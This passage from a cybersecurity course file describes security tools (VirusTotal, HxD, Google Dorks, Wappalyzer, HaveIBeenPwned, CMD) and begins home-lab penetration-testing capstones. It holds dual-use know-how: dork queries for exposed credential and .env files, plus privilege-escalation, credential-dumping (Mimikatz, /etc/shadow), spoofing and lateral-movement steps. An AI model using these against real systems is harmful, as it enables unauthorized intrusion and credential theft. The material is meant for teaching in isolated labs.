                  <li>Always obtain authorization before capturing traffic.</li>
                  <li>Tools: Wireshark, tshark, tcpdump, Npcap, Cloudshark, Malware Traffic Analysis.</li>
                  <li>Understanding Wireshark is essential for network and security analysis.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.wireshark.org/" target="_blank" rel="noopener">Wireshark — Official site</a>
                  <a href="https://www.wireshark.org/docs/wsug_html_chunked/" target="_blank" rel="noopener">Wireshark User's Guide</a>
                  <a href="https://www.wireshark.org/docs/dfref/" target="_blank" rel="noopener">Wireshark Display Filter Reference</a>
                  <a href="https://wiki.wireshark.org/CaptureFilters" target="_blank" rel="noopener">Wireshark Capture Filter Reference</a>
                  <a href="https://wiki.wireshark.org/SampleCaptures" target="_blank" rel="noopener">Wireshark Sample Captures</a>
                </div>
              </section>
            ` },,
                    { id: "6.3", title: "Security Tools Arsenal", pages: "583-600", read: 22,
            build: "Analyze a suspicious file with VirusTotal, HxD, Wappalyzer, and HaveIBeenPwned.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>VirusTotal</strong> is a free online service owned by Google that analyzes files and URLs for viruses, worms, trojans, and other kinds of malicious content. It aggregates results from over 70 antivirus scanners and URL/domain blocklist services, producing a comprehensive threat score and relevant context for each scanned item. VirusTotal also offers an API for programmatic access, enabling integration into security workflows.</p>
                <p><strong>HxD</strong> is a free, lightweight hexadecimal editor and disk editor for Windows. It allows users to view and edit files, disks, and memory at the byte level. It is widely used for static malware analysis, forensic investigation, and debugging.</p>
                <p><strong>Google Dorks</strong> are advanced search queries that use specialized operators to uncover sensitive information, vulnerable systems, and exposed data indexed by Google. They are essential for penetration testers, bug bounty hunters, and digital investigators conducting Open-Source Intelligence (OSINT) gathering.</p>
                <p><strong>Wappalyzer</strong> is a technology fingerprinting tool that identifies the technologies used on websites, including Content Management Systems (CMS), JavaScript frameworks, web servers, programming languages, analytics tools, payment processors, and CDNs. It is available as a browser extension and as a command-line tool/API.</p>
                <p><strong>HaveIBeenPwned (HIBP)</strong> is a free service that allows users to check whether their email addresses or passwords have been compromised in known data breaches. It provides a RESTful API for programmatic queries, including breach account checks, pastes, domain searches, and the Pwned Passwords API.</p>
                <p><strong>Command Line (CMD)</strong> refers to the Windows Command Prompt and its suite of networking and system diagnostic commands. These commands provide powerful, low-level access to network configuration, connectivity testing, DNS resolution, routing analysis, and connection monitoring.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenarios</h3>
                <ul class="content-list">
                  <li><strong>VirusTotal:</strong> A security analyst receives a suspicious email attachment named <code>invoice.pdf.exe</code>. Before opening it, they upload it to VirusTotal. The scan reveals that 45 out of 70 antivirus engines detect it as a trojan. The analyst also uses the "Relations" tab to discover that the file communicates with a known malicious IP address.</li>
                  <li><strong>HxD:</strong> A malware analyst examines a suspicious executable. They open it in HxD and inspect the file header. They notice unusual byte patterns in the PE header and strings that appear to be obfuscated. They compare the file against a known clean version using HxD's file comparison feature and identify injected code.</li>
                  <li><strong>Google Dorks:</strong> A penetration tester searches for exposed configuration files: <code>site:example.com filetype:env</code>. This query reveals a .env file containing database credentials and API keys.</li>
                  <li><strong>Wappalyzer:</strong> A penetration tester visits a client's website and uses the Wappalyzer browser extension. The tool reveals that the site is built on WordPress 5.4.2, uses Apache as the web server, and runs the WooCommerce plugin. WordPress 5.4.2 has known vulnerabilities.</li>
                  <li><strong>HaveIBeenPwned:</strong> An employee receives a notification that their corporate email was found in a data breach. They use HaveIBeenPwned to check the details. The security team resets the employee's credentials and enables MFA.</li>
                  <li><strong>CMD:</strong> A system administrator troubleshoots a slow network connection. They run <code>tracert google.com</code> and see high latency at a specific hop. They also run <code>netstat -ano</code> to check for unusual outbound connections.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Security Tools In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/security-tools.png" alt="Security tools arsenal — VirusTotal, HxD, Google Dorks, Wappalyzer, HaveIBeenPwned, and CMD" />
                  <figcaption>Figure 6.3 — Essential security tools for analysis, reconnaissance, and incident response.</figcaption>
                </figure>

                <h4 class="sub-h">VirusTotal</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Capability</span><span>Description</span></div>
                  <div class="tool-row"><span>File Scanning</span><span>Upload files for multi-engine analysis</span></div>
                  <div class="tool-row"><span>URL Scanning</span><span>Scan URLs against 70+ blocklists</span></div>
                  <div class="tool-row"><span>Hash Search</span><span>Look up existing reports by MD5, SHA-1, or SHA-256</span></div>
                  <div class="tool-row"><span>Domain/IP Reports</span><span>Passive DNS, reputation, and relations</span></div>
                  <div class="tool-row"><span>Sandbox Analysis</span><span>Dynamic behavior reports (10+ sandboxes)</span></div>
                  <div class="tool-row"><span>YARA Livehunt</span><span>Custom rule-based detection</span></div>
                  <div class="tool-row"><span>VirusTotal Graph</span><span>Visualize relationships between IOCs</span></div>
                  <div class="tool-row"><span>Community Comments</span><span>Crowdsourced insights and false-positive flags</span></div>
                  <div class="tool-row"><span>API v3</span><span>RESTful API for automation and integration</span></div>
                </div>
                <p><strong>Public API:</strong> 500 requests/day, 4/minute; not for commercial use. <strong>Premium API:</strong> Customizable rate limit, commercial use permitted, full sandbox data, file download, similarity search.</p>

                <h4 class="sub-h">HxD</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Feature</span><span>Description</span></div>
                  <div class="tool-row"><span>Hex Editor</span><span>View and edit file bytes directly</span></div>
                  <div class="tool-row"><span>Disk Editor</span><span>Edit raw data on hard drives, USB, etc.</span></div>
                  <div class="tool-row"><span>Memory Editor</span><span>View and modify running processes' memory</span></div>
                  <div class="tool-row"><span>Search</span><span>Find text, hex values, or integers</span></div>
                  <div class="tool-row"><span>Data Inspector</span><span>Interpret selected data as various types</span></div>
                  <div class="tool-row"><span>Checksums/Hashes</span><span>Calculate CRC, MD5, SHA</span></div>
                  <div class="tool-row"><span>File Comparison</span><span>Find differences between two files</span></div>
                  <div class="tool-row"><span>Statistics/Graphs</span><span>Visualize character distribution</span></div>
                  <div class="tool-row"><span>Plugin Framework</span><span>Extend functionality</span></div>
                </div>
                <p><strong>How to Use HxD for Malware Analysis:</strong></p>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Open the file: File → Open (Ctrl+O)</div>
                  <div class="step-item"><span class="step-num">2</span> Inspect the header: Look for PE header (MZ, PE), packer signatures, or unusual patterns.</div>
                  <div class="step-item"><span class="step-num">3</span> Search for strings: Search → Find (Ctrl+F) for URLs, IP addresses, registry keys.</div>
                  <div class="step-item"><span class="step-num">4</span> Calculate hashes: Analysis → Checksums for MD5/SHA-256 to submit to VirusTotal.</div>
                  <div class="step-item"><span class="step-num">5</span> Compare files: Analysis → File-compare to compare against a known clean version.</div>
                  <div class="step-item"><span class="step-num">6</span> Inspect disk/memory: Extras → Open disk or Open RAM (requires admin).</div>
                </div>

                <h4 class="sub-h">Google Dorks</h4>
                <p>Google Dorks are advanced search queries that use operators to filter and uncover information not easily found through standard searches. Google's crawlers index not just visible text but also metadata, directories, error messages, and document contents. Dorks exploit this to find exposed sensitive information.</p>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Operator</span><span>Description</span><span>Example</span></div>
                  <div class="tool-row"><span>site:</span><span>Search within a specific domain</span><span>site:example.com</span></div>
                  <div class="tool-row"><span>inurl:</span><span>Keyword in URL</span><span>inurl:login</span></div>
                  <div class="tool-row"><span>intitle:</span><span>Keyword in page title</span><span>intitle:admin</span></div>
                  <div class="tool-row"><span>intext:</span><span>Keyword in page text</span><span>intext:password</span></div>
                  <div class="tool-row"><span>filetype:</span><span>Specific file type</span><span>filetype:pdf</span></div>
                  <div class="tool-row"><span>ext:</span><span>Same as filetype</span><span>ext:log</span></div>
                  <div class="tool-row"><span>cache:</span><span>Cached version of page</span><span>cache:example.com</span></div>
                  <div class="tool-row"><span>related:</span><span>Related sites</span><span>related:example.com</span></div>
                  <div class="tool-row"><span>-</span><span>Exclude word</span><span>password -reset</span></div>
                  <div class="tool-row"><span>OR</span><span>Logical OR</span><span>intitle:password OR inurl:login</span></div>
                  <div class="tool-row"><span>allinurl:</span><span>All keywords in URL</span><span>allinurl:admin login</span></div>
                  <div class="tool-row"><span>allintitle:</span><span>All keywords in title</span><span>allintitle:admin user</span></div>
                </div>
                <p><strong>Practical Dork Examples:</strong> <code>filetype:pdf security</code>, <code>intitle:"index of /"</code>, <code>allinurl:"admin login"</code>, <code>intext:password filetype:txt</code>, <code>filetype:log</code>, <code>site:example.com filetype:env</code>, <code>inurl:/phpmyadmin/</code>, <code>intext:"SQL syntax near"</code></p>
                <p><strong>Google Hacking Database (GHDB):</strong> A categorized index of Google Dorks maintained by OffSec on Exploit-DB. Contains thousands of pre-built queries. Available at https://www.exploit-db.com/google-hacking-database</p>

                <h4 class="sub-h">Wappalyzer</h4>
                <p>Wappalyzer identifies the technologies used on websites by analyzing HTML code, JavaScript variables, response headers, and other signals. It matches these against a database of over 1,400 technology fingerprints.</p>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Category</span><span>Examples</span></div>
                  <div class="tool-row"><span>CMS</span><span>WordPress, Joomla, Drupal, Shopify</span></div>
                  <div class="tool-row"><span>JavaScript Frameworks</span><span>React, Angular, Vue.js, Next.js</span></div>
                  <div class="tool-row"><span>Web Servers</span><span>Apache, Nginx, IIS, LiteSpeed</span></div>
                  <div class="tool-row"><span>Programming Languages</span><span>PHP, Python, Ruby, Node.js</span></div>
                  <div class="tool-row"><span>Analytics</span><span>Google Analytics, Hotjar, Matomo</span></div>
                  <div class="tool-row"><span>Payment Processors</span><span>Stripe, PayPal, Square</span></div>
                  <div class="tool-row"><span>CDNs</span><span>Cloudflare, Akamai, Fastly</span></div>
                  <div class="tool-row"><span>Security</span><span>HSTS, CSP headers</span></div>
                  <div class="tool-row"><span>E-commerce</span><span>WooCommerce, Magento, Shopify</span></div>
                  <div class="tool-row"><span>Marketing</span><span>HubSpot, Marketo, Mailchimp</span></div>
                </div>
                <p><strong>How to Use:</strong> Browser extension (recommended) — install from Chrome Web Store or Firefox Add-ons, visit any website, click the Wappalyzer icon. Command-line — Python: <code>python -m pip install wappalyzer-python3</code>; Node.js: <code>npm i @ryntab/wappalyzer-node</code>.</p>

                <h4 class="sub-h">HaveIBeenPwned (HIBP)</h4>
                <p>HaveIBeenPwned allows users to check whether their email addresses or passwords have been exposed in data breaches. It aggregates breach data from public sources and provides a free API for programmatic queries.</p>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Feature</span><span>Description</span></div>
                  <div class="tool-row"><span>Breach Account API</span><span>Check if an email appeared in breaches</span></div>
                  <div class="tool-row"><span>Pwned Passwords API</span><span>Check if a password has been exposed (k-anonymity)</span></div>
                  <div class="tool-row"><span>Pastes API</span><span>Check for email in pastes</span></div>
                  <div class="tool-row"><span>Domain Search</span><span>Find breached accounts for a domain</span></div>
                  <div class="tool-row"><span>Stealer Logs</span><span>Check for credentials in infostealer logs</span></div>
                  <div class="tool-row"><span>Subscriber Features</span><span>Notifications, domain verification, higher rate limits</span></div>
                  <div class="tool-row"><span>MCP Server</span><span>For AI agents and MCP-capable clients</span></div>
                </div>
                <p><strong>API Rate Limits:</strong> Public (test) — limited to test addresses; Core 1 — 10 RPM; Core 2 — 50 RPM; Core 3 — 100 RPM; Core 4 — 500 RPM.</p>
                <pre><code># Pwned Passwords API (k-anonymity)
curl https://api.pwnedpasswords.com/range/5BAA6

# Authenticated Breach Account Check
curl https://haveibeenpwned.com/api/v3/breachedaccount/email@example.com \\
  -H "hibp-api-key: YOUR_API_KEY"</code></pre>

                <h4 class="sub-h">Command Line (CMD)</h4>
                <p>The Windows Command Prompt provides low-level access to system and network configuration. These commands are essential for troubleshooting, security auditing, and incident response.</p>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Command</span><span>Purpose</span><span>Example</span></div>
                  <div class="tool-row"><span>ipconfig</span><span>Display IP configuration</span><span>ipconfig /all</span></div>
                  <div class="tool-row"><span>ping</span><span>Test connectivity</span><span>ping google.com</span></div>
                  <div class="tool-row"><span>tracert</span><span>Trace packet route</span><span>tracert google.com</span></div>
                  <div class="tool-row"><span>pathping</span><span>Combined ping/tracert with stats</span><span>pathping google.com</span></div>
                  <div class="tool-row"><span>netstat</span><span>Network statistics and connections</span><span>netstat -ano</span></div>
                  <div class="tool-row"><span>nslookup</span><span>DNS query</span><span>nslookup example.com</span></div>
                  <div class="tool-row"><span>net view</span><span>List network shares</span><span>net view \\\\server</span></div>
                  <div class="tool-row"><span>net use</span><span>Map network drive</span><span>net use Z: \\\\server\\share</span></div>
                  <div class="tool-row"><span>net user</span><span>Manage user accounts</span><span>net user username</span></div>
                  <div class="tool-row"><span>arp</span><span>Display/modify ARP cache</span><span>arp -a</span></div>
                  <div class="tool-row"><span>route</span><span>Display/modify routing table</span><span>route print</span></div>
                  <div class="tool-row"><span>nbtstat</span><span>NetBIOS over TCP/IP statistics</span><span>nbtstat -A 192.168.1.1</span></div>
                  <div class="tool-row"><span>netsh</span><span>Advanced network configuration</span><span>netsh interface ip show config</span></div>
                </div>
                <p><strong>Practical Worked Examples:</strong></p>
                <pre><code># Identify which process is holding a specific port
netstat -ano | findstr :443
tasklist /fi "pid eq 4452"

# Check if a remote port is reachable
Test-NetConnection -ComputerName 192.168.1.50 -Port 80

# Flush DNS cache and renew IP
ipconfig /flushdns
ipconfig /release
ipconfig /renew

# List only listening ports
netstat -an | findstr LISTENING

# View ARP cache
arp -a</code></pre>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Attack Vectors &amp; Use Cases</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Offensive Use</span>
                    <ul>
                      <li><strong>Reconnaissance:</strong> Google Dorks for exposed files; Wappalyzer for technology fingerprinting.</li>
                      <li><strong>Credential Discovery:</strong> HaveIBeenPwned to check for breached credentials.</li>
                      <li><strong>Malware Analysis:</strong> HxD for static analysis; VirusTotal for multi-engine scanning.</li>
                      <li><strong>Network Mapping:</strong> CMD commands (netstat, arp, route) for local network discovery.</li>
                      <li><strong>Exploitation:</strong> Using discovered technologies and credentials to plan attacks.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Defensive Use</span>
                    <ul>
                      <li><strong>Threat Intelligence:</strong> VirusTotal for IOC validation and enrichment.</li>
                      <li><strong>Incident Response:</strong> HxD for forensic analysis; CMD for network diagnostics.</li>
                      <li><strong>Security Awareness:</strong> HaveIBeenPwned to check for compromised credentials.</li>
                      <li><strong>Security Auditing:</strong> Wappalyzer to identify outdated software.</li>
                      <li><strong>Exposure Monitoring:</strong> Google Dorks to find sensitive data leaks.</li>
                    </ul>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Tools &amp; Resources</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span><span>Link</span></div>
                  <div class="tool-row"><span>VirusTotal</span><span>Multi-engine file/URL scanner</span><span>https://www.virustotal.com/</span></div>
                  <div class="tool-row"><span>HxD</span><span>Hex editor and disk editor</span><span>https://mh-nexus.de/en/hxd/</span></div>
                  <div class="tool-row"><span>Google Hacking Database</span><span>Index of Google Dorks</span><span>https://www.exploit-db.com/google-hacking-database</span></div>
                  <div class="tool-row"><span>Wappalyzer</span><span>Technology fingerprinting</span><span>https://www.wappalyzer.com/</span></div>
                  <div class="tool-row"><span>HaveIBeenPwned</span><span>Breach checking</span><span>https://haveibeenpwned.com/</span></div>
                  <div class="tool-row"><span>WhatWeb</span><span>Technology fingerprinting (alternative)</span><span>https://github.com/urbanadventurer/WhatWeb</span></div>
                  <div class="tool-row"><span>Cloudshark</span><span>Web-based PCAP analysis</span><span>https://www.cloudshark.org/</span></div>
                  <div class="tool-row"><span>Malware Traffic Analysis</span><span>PCAP exercises</span><span>https://www.malware-traffic-analysis.net/</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>VirusTotal aggregates 70+ antivirus engines and sandboxes for file/URL analysis. Public API has 500 requests/day limit.</li>
                  <li>HxD is a hex editor for byte-level file, disk, and memory inspection. Essential for malware analysis and forensics.</li>
                  <li>Google Dorks use advanced search operators to uncover exposed sensitive information. GHDB provides thousands of pre-built dorks.</li>
                  <li>Wappalyzer identifies website technologies from a database of 1,400+ fingerprints. Available as browser extension, Python, and Node.js.</li>
                  <li>HaveIBeenPwned checks email addresses and passwords against known breaches. Free Pwned Passwords API uses k-anonymity.</li>
                  <li>CMD provides essential networking commands: ipconfig, ping, tracert, netstat, nslookup, arp, route, netsh.</li>
                  <li>All tools should be used ethically and legally; obtain authorization before testing any system you do not own.</li>
                  <li>Understanding these tools is essential for reconnaissance, analysis, troubleshooting, and incident response.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://docs.virustotal.com/reference/overview" target="_blank" rel="noopener">VirusTotal API v3 Documentation</a>
                  <a href="https://mh-nexus.de/en/hxd/" target="_blank" rel="noopener">HxD Official Site</a>
                  <a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">Google Hacking Database (GHDB)</a>
                  <a href="https://www.wappalyzer.com/" target="_blank" rel="noopener">Wappalyzer Official Site</a>
                  <a href="https://haveibeenpwned.com/API/v3" target="_blank" rel="noopener">HaveIBeenPwned API v3</a>
                </div>
              </section>
            ` },
        ],
      },

      // ============================================================
      // MODULE 7 — CAPSTONE & CAREER
      // ============================================================
      {
        id: "m7",
        type: "part",
        number: 7,
        title: "Capstone Projects & Career",
        icon: "🎯",
        blurb: "Everything you've learned, put to work. These projects prove your skills to employers — and to yourself.",
        chapters: [
                    { id: "7.1", title: "Home Lab Projects (Capstone)", pages: "601-620", read: 25,
            build: "Build a complete home lab and execute a full penetration test capstone project.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>A Home Lab</strong> is a personal, isolated computing environment built for learning, practicing, and experimenting with cybersecurity techniques, tools, and scenarios. It typically consists of virtual machines, network simulators, and intentionally vulnerable applications running on a single physical computer or a small cluster of devices. Home labs allow learners to safely perform offensive and defensive exercises without legal or ethical concerns, as all activity is contained within the lab.</p>
                <p><strong>Capstone Projects</strong> are comprehensive, hands-on exercises that integrate multiple skills and tools learned throughout a course. They simulate real-world scenarios and require planning, execution, documentation, and presentation. In cybersecurity education, capstone projects demonstrate practical competence and serve as portfolio pieces for job applications.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenario</h3>
                <p>A cybersecurity student builds a home lab using VirtualBox on a laptop with 16 GB RAM. They create three virtual machines:</p>
                <ul class="content-list">
                  <li><strong>Kali Linux (attacker)</strong></li>
                  <li><strong>Windows 10 (victim)</strong></li>
                  <li><strong>Metasploitable 2 (vulnerable target)</strong></li>
                </ul>
                <p>They configure a Host-Only network so the VMs can communicate with each other but not with the internet. The student then performs a full penetration test against Metasploitable:</p>
                <ul class="content-list">
                  <li><strong>Reconnaissance:</strong> Nmap scan to discover open ports and services.</li>
                  <li><strong>Exploitation:</strong> Metasploit to exploit a vulnerable service (e.g., vsftpd).</li>
                  <li><strong>Post-Exploitation:</strong> Privilege escalation, credential dumping, and persistence.</li>
                  <li><strong>Lateral Movement:</strong> Pivoting to the Windows VM.</li>
                  <li><strong>Reporting:</strong> Documenting findings, risk ratings, and remediation steps.</li>
                </ul>
                <p>The student records their screen, documents every command, and writes a professional penetration testing report. This project becomes a portfolio piece that helps them land their first SOC analyst role.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Building the Lab Environment</h3>

                <figure class="content-figure">
                  <img src="./img/home-lab.png" alt="Home lab architecture — Kali attacker, Windows victim, Metasploitable target on Host-Only network" />
                  <figcaption>Figure 7.1 — A typical home lab: isolated VMs on a Host-Only network for safe offensive and defensive practice.</figcaption>
                </figure>

                <h4 class="sub-h">Hardware Requirements</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Component</span><span>Minimum</span><span>Recommended</span></div>
                  <div class="tool-row"><span>CPU</span><span>4 cores</span><span>8+ cores</span></div>
                  <div class="tool-row"><span>RAM</span><span>8 GB</span><span>16–32 GB</span></div>
                  <div class="tool-row"><span>Storage</span><span>100 GB free</span><span>500 GB SSD</span></div>
                  <div class="tool-row"><span>Network</span><span>Ethernet or Wi-Fi</span><span>Ethernet with VLAN support</span></div>
                </div>

                <h4 class="sub-h">Software Options (Hypervisors)</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Hypervisor</span><span>Platform</span><span>Cost</span><span>Notes</span></div>
                  <div class="tool-row"><span>VirtualBox</span><span>Windows, Linux, macOS</span><span>Free</span><span>Beginner-friendly</span></div>
                  <div class="tool-row"><span>VMware Workstation Player</span><span>Windows, Linux</span><span>Free</span><span>Better performance</span></div>
                  <div class="tool-row"><span>VMware Workstation Pro</span><span>Windows, Linux</span><span>Paid</span><span>Advanced features</span></div>
                  <div class="tool-row"><span>Hyper-V</span><span>Windows Pro/Enterprise</span><span>Free</span><span>Built-in</span></div>
                  <div class="tool-row"><span>KVM/QEMU</span><span>Linux</span><span>Free</span><span>High performance</span></div>
                  <div class="tool-row"><span>Proxmox VE</span><span>Bare metal</span><span>Free</span><span>Type-1 hypervisor</span></div>
                </div>

                <h4 class="sub-h">Essential VMs</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>VM</span><span>Purpose</span><span>Download</span></div>
                  <div class="tool-row"><span>Kali Linux</span><span>Attacker</span><span>https://www.kali.org/get-kali/</span></div>
                  <div class="tool-row"><span>Windows 10/11</span><span>Victim</span><span>https://www.microsoft.com/en-us/evalcenter/</span></div>
                  <div class="tool-row"><span>Metasploitable 2</span><span>Vulnerable Linux target</span><span>https://docs.rapid7.com/metasploit/metasploitable-2/</span></div>
                  <div class="tool-row"><span>DVWA</span><span>Vulnerable web app</span><span>https://dvwa.co.uk/</span></div>
                  <div class="tool-row"><span>OWASP Juice Shop</span><span>Modern vulnerable web app</span><span>https://owasp.org/www-project-juice-shop/</span></div>
                  <div class="tool-row"><span>Ubuntu Server</span><span>General purpose</span><span>https://ubuntu.com/download/server</span></div>
                  <div class="tool-row"><span>pfSense</span><span>Firewall/router</span><span>https://www.pfsense.org/</span></div>
                  <div class="tool-row"><span>Security Onion</span><span>Network monitoring</span><span>https://securityonion.net/</span></div>
                </div>

                <h4 class="sub-h">Network Configuration</h4>
                <ul class="content-list">
                  <li><strong>Host-Only Adapter:</strong> VMs communicate with each other and the host, but not the internet. Best for isolated practice.</li>
                  <li><strong>NAT Adapter:</strong> VMs can access the internet for updates, but are not directly reachable from outside.</li>
                  <li><strong>Internal Network:</strong> VMs communicate only with each other, not the host or internet. Most isolated.</li>
                  <li><strong>Bridged Adapter:</strong> VM appears as a separate device on the physical network. Use with caution.</li>
                </ul>
                <p><strong>Best Practice:</strong> Use Host-Only for attack/defense practice. Add a second NAT adapter on Kali for tool updates only.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Capstone Project 1: Full Penetration Test</h3>
                <p><strong>Objective:</strong> Perform a complete penetration test against a vulnerable target and produce a professional report.</p>
                <p><strong>Target:</strong> Metasploitable 2 or DVWA</p>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Planning and Scoping: Define target IP range (e.g., 192.168.56.0/24). Set rules of engagement. Document objectives.</div>
                  <div class="step-item"><span class="step-num">2</span> Reconnaissance: Passive (OSINT with theHarvester, Shodan, Google Dorks). Active (Nmap scan: <code>nmap -sS -sV -p- 192.168.56.101</code>).</div>
                  <div class="step-item"><span class="step-num">3</span> Vulnerability Analysis: Nmap NSE scripts (<code>nmap --script vuln 192.168.56.101</code>). OpenVAS/Nessus scan. Manual inspection.</div>
                  <div class="step-item"><span class="step-num">4</span> Exploitation: Metasploit modules (<code>msfconsole</code>). Manual exploitation with Netcat, Python. Web exploitation with Burp Suite, SQLMap.</div>
                  <div class="step-item"><span class="step-num">5</span> Post-Exploitation: Privilege escalation (Linux: <code>sudo -l</code>, <code>find / -perm -4000</code>; Windows: <code>whoami /priv</code>, PowerUp.ps1). Credential dumping (Mimikatz, /etc/shadow). Persistence (cron jobs, registry keys, scheduled tasks). Lateral movement (PsExec, WMI, SSH).</div>
                  <div class="step-item"><span class="step-num">6</span> Reporting: Executive summary. Methodology. Findings with risk ratings (CVSS). Evidence (screenshots, command output). Remediation recommendations. Appendices (tools used, raw output).</div>
                </div>
                <p><strong>Deliverables:</strong> Penetration testing report (PDF), screen recording, command log.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Capstone Project 2: Network Traffic Analysis</h3>
                <p><strong>Objective:</strong> Capture, analyze, and document network traffic to identify malicious activity.</p>
                <p><strong>Setup:</strong> Kali VM (attacker), Windows VM (victim), Security Onion or Wireshark on monitoring VM, Host-Only network.</p>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Baseline Capture: Capture normal traffic for 10 minutes. Identify protocols, endpoints, and patterns.</div>
                  <div class="step-item"><span class="step-num">2</span> Simulate Attack: From Kali, perform Nmap scan, ARP spoofing, DNS spoofing, HTTP credential sniffing. Use arpspoof, dnsspoof, sslstrip.</div>
                  <div class="step-item"><span class="step-num">3</span> Capture Attack Traffic: Use Wireshark or tcpdump to capture all traffic. Save as PCAP file.</div>
                  <div class="step-item"><span class="step-num">4</span> Analyze: Filter for ARP, DNS, HTTP, TCP. Identify attack signatures. Extract credentials from HTTP POST. Reconstruct TCP streams.</div>
                  <div class="step-item"><span class="step-num">5</span> Document: Write an incident report with timeline, IOCs, and recommendations.</div>
                </div>
                <p><strong>Deliverables:</strong> PCAP file, incident report (PDF), Wireshark display filters used.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Capstone Project 3: Malware Analysis</h3>
                <p><strong>Objective:</strong> Analyze a malware sample in a safe lab and document its behavior.</p>
                <p><strong>Setup:</strong> Isolated Windows VM (no internet, Host-Only), REMnux VM (Linux malware analysis), FakeNet-NG or INetSim for network simulation, Process Monitor, Process Explorer, Regshot, Wireshark, Volatility, HxD.</p>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Acquisition: Obtain a safe malware sample from MalwareBazaar, VirusTotal, or training course. Record hashes (MD5, SHA-1, SHA-256).</div>
                  <div class="step-item"><span class="step-num">2</span> Static Analysis: File type, size, strings, PE header. Packer detection (Detect It Easy, PEiD). YARA scan.</div>
                  <div class="step-item"><span class="step-num">3</span> Dynamic Analysis: Run in isolated VM. Monitor process creation, file system changes, registry changes, network connections. Capture traffic with Wireshark and FakeNet-NG.</div>
                  <div class="step-item"><span class="step-num">4</span> Memory Analysis: Capture memory with DumpIt or WinPmem. Analyze with Volatility (pslist, malfind, netscan).</div>
                  <div class="step-item"><span class="step-num">5</span> IOC Extraction: Hashes, IPs, domains, file paths, registry keys, mutexes. Create YARA rule.</div>
                  <div class="step-item"><span class="step-num">6</span> Reporting: Malware analysis report with behavior, IOCs, and detection recommendations.</div>
                </div>
                <p><strong>Deliverables:</strong> Malware analysis report (PDF), YARA rule, IOCs list (CSV/JSON), PCAP file.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Capstone Project 4: Build a SOC Lab</h3>
                <p><strong>Objective:</strong> Build a functional SOC lab with SIEM, IDS, and endpoint monitoring.</p>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Component</span><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>SIEM</span><span>Wazuh, ELK, Splunk Free</span><span>Log aggregation and correlation</span></div>
                  <div class="tool-row"><span>IDS/IPS</span><span>Snort, Suricata</span><span>Network detection</span></div>
                  <div class="tool-row"><span>Endpoint</span><span>Sysmon, osquery, Wazuh agent</span><span>Endpoint visibility</span></div>
                  <div class="tool-row"><span>Threat Intel</span><span>MISP, AlienVault OTX</span><span>IOC enrichment</span></div>
                  <div class="tool-row"><span>Case Management</span><span>TheHive, Cortex</span><span>Incident tracking</span></div>
                  <div class="tool-row"><span>SOAR</span><span>Shuffle</span><span>Automation</span></div>
                </div>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Deploy Wazuh server on Ubuntu.</div>
                  <div class="step-item"><span class="step-num">2</span> Install Wazuh agents on Windows and Linux VMs.</div>
                  <div class="step-item"><span class="step-num">3</span> Configure Sysmon on Windows and forward logs to Wazuh.</div>
                  <div class="step-item"><span class="step-num">4</span> Deploy Suricata on a monitoring interface.</div>
                  <div class="step-item"><span class="step-num">5</span> Integrate MISP for threat intelligence.</div>
                  <div class="step-item"><span class="step-num">6</span> Simulate attacks (Nmap, brute force, malware) and observe alerts.</div>
                  <div class="step-item"><span class="step-num">7</span> Create detection rules (Sigma, Wazuh rules).</div>
                  <div class="step-item"><span class="step-num">8</span> Document the architecture and incident response playbooks.</div>
                </div>
                <p><strong>Deliverables:</strong> SOC lab architecture diagram, detection rules, incident response playbook, sample alerts and investigations.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Capstone Project 5: Web Application Security Assessment</h3>
                <p><strong>Objective:</strong> Assess the security of a vulnerable web application and exploit found vulnerabilities.</p>
                <p><strong>Target:</strong> OWASP Juice Shop, DVWA, or WebGoat.</p>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Reconnaissance: Wappalyzer for technology fingerprinting. Nmap for open ports. Dirb/Gobuster for directory discovery.</div>
                  <div class="step-item"><span class="step-num">2</span> Vulnerability Discovery: Burp Suite spider and scanner. OWASP ZAP automated scan. Manual testing for OWASP Top 10.</div>
